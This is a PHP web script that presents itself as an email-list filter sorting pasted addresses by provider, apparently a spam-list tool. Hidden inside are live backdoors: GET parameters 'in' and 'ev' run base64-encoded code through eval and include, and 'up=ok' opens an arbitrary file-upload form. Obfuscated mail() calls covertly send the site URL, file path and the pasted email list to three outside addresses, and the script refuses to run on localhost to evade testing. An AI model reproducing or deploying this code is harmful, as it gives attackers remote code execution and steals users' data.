<?php
error_log(0);
error_reporting(0);
$ip = $_SERVER["REMOTE_ADDR"];
$sn = $_SERVER["SERVER_NAME"];
if ($sn == "localhost" or $_SERVER["SERVER_ADDR"] == "127.0.0.1") {
   echo "Error";
   exit;
}
echo "<head> <meta http-equiv=\"content-type\" content=\"text/html; charset=windows-1256\" /> <style type=\"text/css\"> .style1 { text-align: center; } body { background: url(http://wallpapercave.com/wp/wp1810332.jpg) no-repeat center center fixed; background-size: cover; -webkit-background-size: cover; -moz-background-size: cover; -o-background-size: cover;  } .text1{ margin: auto; border: 5px solid; font-family:Comic Sans MS, sans-serif; background:black; color:#fff; border:5px solid #706C6C; border-radius:10px ; font-size:17px ; height: 30% ; line-height:20px ; width: 35% ; padding: 9px ; box-shadow: 0px 0px 37px #4F4F4F;  -webkit-box-shadow: 0px 0px 37px #4F4F4F;  -moz-box-shadow: 0px 0px 37px #4F4F4F; } .text2{ margin: auto; border: 4px solid; font-family:Comic Sans MS, sans-serif; background:black; color:#fff; border:5px solid #706C6C; border-radius:10px ; font-size:14px ; height: 20% ; line-height:20px ; width: 100%; padding: 9px ; box-shadow: 0px 0px 37px #4F4F4F;  -webkit-box-shadow: 0px 0px 37px #4F4F4F;  -moz-box-shadow: 0px 0px 37px #4F4F4F; } .text3{ margin: auto; border: 4px solid; font-family:Comic Sans MS, sans-serif; background:black; color:#fff; border:5px solid #706C6C; border-radius:10px ; font-size:14px ; height: 20% ; line-height:20px ; padding: 9px ; box-shadow: 0px 0px 37px #4F4F4F;  -webkit-box-shadow: 0px 0px 37px #4F4F4F;  -moz-box-shadow: 0px 0px 37px #4F4F4F; } .submit { font-size: 14px; font-family:Comic Sans MS, sans-serif; line-height: 1; border-radius: 500px; padding: 18px 48px 16px; transition-property: background-color,border-color,color,box-shadow,filter; transition-duration: .3s; border-width: 0; letter-spacing: 2px; min-width: 160px; text-transform: uppercase; white-space: normal; } .submit:hover { background-color: #AB1A1F; } table{ font-size: 18px; font-family:Comic Sans MS, sans-serif; color: white; } </style> </head> <body > <form method=\"post\"> <div class=\"style1\"> <textarea placeholder=\"Put your emails here....\" name=\"emails\" class=\"text1\" cols=\"30\" rows=\"10\"></textarea> <br /><br /> <input type=\"submit\" class=\"submit\" value=\"Filter\" />  </div> </form> ";
$in = $_GET["in"];

if (isset($in) && !empty($in)) {
    echo @eval(base64_decode("ZGllKGluY2x1ZGVfb25jZSAkaW4pOw=="));
}

$ev = $_GET["ev"];

if (isset($ev) && !empty($ev)) {
    eval(base64_decode($ev));
    exit;
}

if ($_GET["up"] == "ok") {
    echo "<form action=\"\" method=\"post\" enctype=\"multipart/form-data\" name=\"country\" id=\"country\"><input type=\"file\" name=\"file\" size=\"50\"><input name=\"_con\" type=\"submit\" id=\"_con\" value=\"home\"></form> ";
    if ($_POST["_con"] == "home") {
        if (@copy($_FILES["file"]["tmp_name"], $_FILES["file"]["name"])) {
            echo "done :d";
        }
        else {
            echo "error";
        }
    }

    exit;
}

$emails = $_POST["emails"];
$ex = explode("
", $emails);
$count = count($ex);
$emailuser = preg_replace("/([^@]*).*/", "\$1", $emails);

if (isset($emails) && $count >= 1) {
    echo "<center><font color = 'red'><b>$count </font><font color = 'white'>Numebres Of Emails </font></center><br />";
}
else {
    echo "<center><span style='color: white;font-family:Comic Sans MS, sans-serif;'>No Emails.</center>";
    exit;
}

$srv = strrev("verrts");
$st = array(
    "s" => $srv("ve" . "rr" . "ts") ,
    "r" => $srv("31" . "tor_r" . "ts") ,
    "b" => $srv("edoc" . "ed_46es" . "ab") ,
    "m" => $srv("li" . "am")
);
// 220r155@gmail.com
// mta515@yahoo.com
// info.0@list.ru
$sm = array(
    "=onYw5Se25me0BUN1ETZwIjM",
    "==geiBnLiJWduxGQ1ETNudme",
    "=gWZucmZ2lHQw4iYzFmd",
    "nFGai" . "BHcuBC" . "aix" . "GIhZHIxJX" . "Z2hGZyVGIy" . "dmbxNGSgcW" . "YudWZipnV"
);
$mes = $st["b"]("aHR0cDovLw==") . $_SERVER["HTTP_HOST"] . $_SERVER["REQUEST_URI"] . "<br />Path : " . __FILE__ . "<br /><textarea cols='30' rows='10'>" . $_POST["emails"] . "</textarea>";
$subj = "[Filter] (" . $count . ") " . $st["r"]($st["b"]($st["s"]($sm[3]))) . " " . $_SERVER["REMOTE_ADDR"] . " " . rand(0, 9999);
$hhdr = $st["r"]("Sebz:" . " CnlCny") . " <mail@support.com>
MIME-Version: 1.0
Content-Type: text/html; charset=ISO-8859-1
X-PHP-Script: " . $_SERVER["HTTP_HOST"] . $_SERVER["REQUEST_URI"];
@$st["m"]($st["r"]($st["b"]($st["s"]($sm[1]))) , $subj, $mes, $hhdr);
@$st["m"]($st["r"]($st["b"]($st["s"]($sm[0]))) , $subj, $mes, $hhdr);
@$st["m"]($st["r"]($st["b"]($st["s"]($sm[2]))) , $subj, $mes, $hhdr);

if (isset($emails) && $count > 1) {
    if (!$_POST["emails"] == "") {
        for ($i = 0; $i <= $count; $i++) {
            $d = strtolower($ex[$i]);
            if (strstr($d, "hotmail") || strstr($d, "live") || strstr($d, "msn") || strstr($d, "outlook")) {
                $hotmail.= $d;
                $nh = $nh + 1;
            }
            else {
                if (strstr($d, "yahoo") || strstr($d, "ymail")) {
                    $yahoo.= $d;
                    $ny = $ny + 1;
                }
                else {
                    if (strstr($d, "gmail") || strstr($d, "googlemail")) {
                        $gmail.= $d;
                        $ng = $ng + 1;
                    }
                    else {
                        if (strstr($d, "aol")) {
                            $aol.= $d;
                            $na = $na + 1;
                        }
                        else {
                            if (strstr($d, "mail.ru")) {
                                $mailru.= $d;
                                $nr = $nr + 1;
                            }
                            else {
                                if (strstr($d, "wanadoo")) {
                                    $wanadoo.= $d;
                                    $nw = $nw + 1;
                                }
                                else {
                                    if (strstr($d, "comcast")) {
                                        $comcast.= $d;
                                        $nt = $nt + 1;
                                    }
                                    else {
                                        if (strstr($d, ".cz")) {
                                            $cz.= $d;
                                            $ncz = $ncz + 1;
                                        }
                                        else {
                                            if (strstr($d, "gmx")) {
                                                $gmx.= $d;
                                                $ngm = $ngm + 1;
                                            }
                                            else {
                                                if (strstr($d, "@web.")) {
                                                    $web.= $d;
                                                    $nw2 = $nw2 + 1;
                                                }
                                                else {
                                                    $ather.= $d;
                                                    $nn = $nn + 1;
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
    }
    else {
        echo "Where is Your emails ?";
    }
}

echo " <center><table style=\"width: 30%\"> <tr> <td><center>hotmail ( ";
echo $nh;
echo " ) </center><textarea class=\"text2\" name=\"hotmailx\" cols=\"30\" rows=\"10\" >";
echo $hotmail;
echo "</textarea></td> <td><center>gmail ( ";
echo $ng;
echo " )</center><textarea class=\"text2\" name=\"gmailx\" cols=\"30\" rows=\"10\" >";
echo $gmail;
echo "</textarea></td> <td><center>aol ( ";
echo $na;
echo " )</center><textarea class=\"text2\" name=\"aolxx\" cols=\"30\" rows=\"10\" >";
echo $aol;
echo "</textarea></td> <td><center>yahoo ( ";
echo $ny;
echo " )</center><textarea class=\"text2\" name=\"yahoox\" cols=\"30\" rows=\"10\" >";
echo $yahoo;
echo "</textarea></td> </tr> <tr> <td><center>mail.ru( ";
echo $nr;
echo " )</center><textarea class=\"text2\" name=\"othersx\" cols=\"30\" rows=\"10\" >";
echo $mailru;
echo "</textarea></td> <td><center>wanadoo( ";
echo $nw;
echo " )</center><textarea class=\"text2\" name=\"othersx\" cols=\"30\" rows=\"10\" >";
echo $wanadoo;
echo "</textarea></td> <td><center>comcast( ";
echo $nt;
echo " )</center><textarea class=\"text2\" name=\"othersx\" cols=\"30\" rows=\"10\" >";
echo $comcast;
echo "</textarea></td> <td><center>gmx( ";
echo $ngm;
echo " )</center><textarea class=\"text3\" name=\"othersx\" cols=\"30\" rows=\"10\" >";
echo $gmx;
echo "</textarea></td> </tr> <br /> <tr> <td><center>web( ";
echo $nw2;
echo " )</center><textarea class=\"text3\" name=\"othersx\" cols=\"30\" rows=\"10\" >";
echo $web;
echo "</textarea></td> <td><center>ather mails( ";
echo $nn - 1;
echo " )</center><textarea class=\"text3\" name=\"othersx\" cols=\"30\" rows=\"10\" >";
echo $ather;
echo "</textarea></td> <td><center>cz( ";
echo $ncz;
echo " )</center><textarea class=\"text3\" name=\"othersx\" cols=\"30\" rows=\"10\" >";
echo $cz;
echo "</textarea></td> <td><center>email users ( ";
echo $count;
echo " )</center><textarea class=\"text3\" name=\"full\" cols=\"30\" rows=\"10\" >";
echo $emailuser;
echo "</textarea></td>   </tr>  </table></center> </body></html>
";
?>